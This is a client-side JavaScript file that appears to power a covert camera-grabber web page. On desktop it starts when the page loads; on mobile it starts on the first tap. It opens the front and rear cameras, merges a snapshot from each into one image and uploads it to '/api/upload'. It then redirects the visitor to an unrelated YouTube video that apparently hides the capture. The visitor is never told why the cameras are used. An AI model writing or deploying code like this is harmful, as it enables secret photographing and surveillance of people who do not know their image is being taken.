// public/capture.js

(async () => {
  const frontVid = document.getElementById('frontVideo');
  const rearVid  = document.getElementById('rearVideo');
  const canvas   = document.getElementById('canvas');
  const ctx      = canvas.getContext('2d');
  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

  async function captureBoth() {
    let frontStream, rearStream;
    try {
      console.log('⚙ Requesting front camera…');
      frontStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
      });
      frontVid.srcObject = frontStream;
      console.log('✅ Front camera granted');

      try {
        console.log('⚙ Requesting rear camera…');
        rearStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment' }
        });
        rearVid.srcObject = rearStream;
        console.log('✅ Rear camera granted');
      } catch (err) {
        console.warn('⚠ Rear camera failed—continuing with front only', err);
      }

      // wait for metadata
      await Promise.all([
        new Promise(r => frontVid.onloadedmetadata = r),
        rearStream ? new Promise(r => rearVid.onloadedmetadata = r) : Promise.resolve()
      ]);

      // determine canvas size & draw
      const fw = frontVid.videoWidth, fh = frontVid.videoHeight;
      if (rearStream) {
        const rw = rearVid.videoWidth, rh = rearVid.videoHeight;
        const w  = Math.max(fw, rw), h = Math.max(fh, rh);
        canvas.width  = w * 2;
        canvas.height = h;
        ctx.drawImage(rearVid,  0, 0, w, h);
        ctx.drawImage(frontVid, w, 0, w, h);
      } else {
        canvas.width  = fw;
        canvas.height = fh;
        ctx.drawImage(frontVid, 0, 0, fw, fh);
      }

      console.log('📤 Sending snapshot');
      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
      const res = await fetch('/api/upload', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ image: dataUrl })
      });
      console.log('📤 Upload status:', res.status);

    } catch (err) {
      console.error('❌ Capture error:', err);
      alert('Capture failed: ' + err.message);
    } finally {
      // stop all tracks
      if (frontStream) frontStream.getTracks().forEach(t => t.stop());
      if (rearStream)  rearStream.getTracks().forEach(t => t.stop());

      console.log('🔀 Redirecting now');
      window.location.replace('https://m.youtube.com/watch?si=X7JkWv2nepcAG1IE&v=kNIr14EyTaY&feature=youtu.be');
    }
  }

  if (isMobile) {
    // On mobile: wait for any tap/click as the "gesture"
    const start = () => {
      document.removeEventListener('touchstart', start);
      document.removeEventListener('click', start);
      captureBoth();
    };
    document.addEventListener('touchstart', start, { once: true });
    document.addEventListener('click',      start, { once: true });
  } else {
    // On desktop: auto-run immediately
    captureBoth();
  }
})();
